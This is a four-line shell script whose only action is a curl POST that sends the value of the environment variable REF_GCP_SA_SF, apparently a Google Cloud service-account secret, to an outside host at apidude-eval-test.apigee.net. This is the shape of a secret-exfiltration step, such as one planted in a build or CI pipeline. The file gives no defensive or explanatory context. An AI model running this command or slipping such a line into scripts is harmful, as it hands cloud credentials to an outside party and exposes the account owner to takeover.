#!/bin/sh

set -e

curl -d "x=$REF_GCP_SA_SF" https://apidude-eval-test.apigee.net/
